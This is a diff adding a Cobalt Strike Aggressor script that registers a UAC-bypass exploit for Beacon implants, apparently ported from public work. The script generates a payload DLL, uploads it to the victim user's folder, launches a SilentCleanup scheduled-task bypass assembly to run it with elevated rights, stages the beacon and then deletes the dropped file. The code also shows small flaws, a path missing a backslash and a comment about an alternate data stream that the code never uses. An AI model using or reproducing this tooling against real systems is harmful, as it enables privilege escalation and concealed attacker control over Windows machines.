@@ -1,0 +1,30 @@
+# credits: rootm0s (orig. python implementation) & plaintext (csharp)
+
+sub silentcleanup_exploit {
+	local('$script $oneliner');
+	# ackowledge command
+	btask($1, "Tasked Beacon to run BypassUAC via SilentCleanup Scheduled Task", "T1088");
+
+	# Generate the payload
+	if (-is64 $1) {
+		$payload = artifact($2, "dllx64");
+	} else {
+		$payload = artifact($2, "dll");
+	}
+	
+	$user = binfo($1, "user");
+
+	# Stuff it into an alternate data stream
+	bupload_raw($1, "C:\\Users\\" . $user . "\\temp.dll", $payload);
+
+	# Task beacon to run exploit with rundll32 and the path to the dll
+	bexecute_assembly($1, script_resource("modules/uac_bypass_silentcleanup.exe"), "c:\\users\\" . $user . "temp.dll,Start");	
+
+	#handle staging
+	bstage($1, $null, $2);
+
+	# Remove file
+	sleep(15 * 1000);
+	brm($1, "C:\\Users\\" . $user . "\\temp.dll");
+}
+beacon_exploit_register("uac-silentcleanup", "t", &silentcleanup_exploit);
